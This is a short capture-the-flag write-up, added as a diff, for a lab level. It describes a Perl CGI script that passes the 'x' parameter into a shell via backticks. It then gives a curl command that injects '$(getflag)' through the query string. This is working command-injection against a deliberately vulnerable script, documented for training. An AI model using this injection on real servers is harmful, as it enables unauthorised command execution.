@@ -1,0 +1,43 @@
+vim level04
+
+# localhost:4747
+a perl server is running in the port 4747 
+
+use CGI qw{param};
+the CGI parses parameters and makes them available via the param() method
+
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+
+this function set the param passed in the x variable to the y
+
+x(param("x"));
+here we are calling the function with the x param
+
+
+
+We have a positiv responce 
+curl -v ip:4747 
+
+
+
+find / -user flag04
+
+/var/www/level04
+/var/www/level04/level04.pl
+/rofs/var/www/level04
+/rofs/var/www/level04/level04.pl
+
+cat /var/www/level04/level04.pl is the same as level04.pl
+
+So, we can execute it ithrough the apache server
+
+
+
+We will exploit the var x and send the getflag command through it 
+
+curl ip:4747/?x='$(getflag)'
+
+and bingo
